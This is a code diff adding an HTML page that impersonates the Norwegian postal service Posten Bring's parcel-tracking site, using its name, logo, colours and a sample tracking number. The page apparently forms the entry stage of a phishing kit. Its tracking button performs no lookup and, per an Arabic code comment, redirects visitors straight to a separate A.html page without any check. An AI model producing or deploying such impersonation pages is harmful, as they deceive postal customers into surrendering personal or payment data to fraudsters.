@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8">
+      <link rel="icon" href="./X9/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Posten - Spor pakken din</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      text-align: center;
+      color: #fff;
+    }
+
+    header {
+      background: #fff;
+      padding: 15px 0;
+    }
+
+    header img {
+      width: 120px;
+    }
+
+    .hero {
+      background: #a40000;
+      padding: 50px 20px;
+      position: relative;
+    }
+
+    .hero h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      font-size: 18px;
+      width: 80%;
+      max-width: 300px;
+      border: none;
+      border-radius: 4px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      background-color: #d32f2f;
+      color: white;
+      padding: 12px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .image-section, .footer {
+      background: #fff;
+      color: #000;
+      padding: 30px 10px;
+    }
+
+    .footer {
+      background: #450000;
+      color: white;
+      font-size: 14px;
+    }
+
+    .footer img {
+      width: 100px;
+    }
+
+    .footer p {
+      margin: 10px 0 0;
+    }
+
+    .illustration {
+      width: 100px;
+      margin: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="./X9/A.png" alt="Posten Logo">
+  </header>
+
+  <div class="hero">
+    <h1>Spor pakken din!</h1>
+    <input type="text" id="trackingNumber" placeholder="3707148233350">
+    <br>
+    <button onclick="trackPackage()">Spor</button>
+  </div>
+
+  <div class="image-section">
+    <img src="./X9/B.png" alt="Pakke" class="illustration">
+    <p>Uåpne pakkebokser på 1 700 steder</p>
+  </div>
+
+  <div class="footer">
+    <img src="./X9/A.png" alt="Posten Logo">
+    <p>© Posten Bring</p>
+  </div>
+
+<script>
+  function trackPackage() {
+    // تحويل مباشر إلى A.html دون أي تحقق
+    window.location.href = "A.html";
+  }
+</script>
+
+
+</body>
+</html>
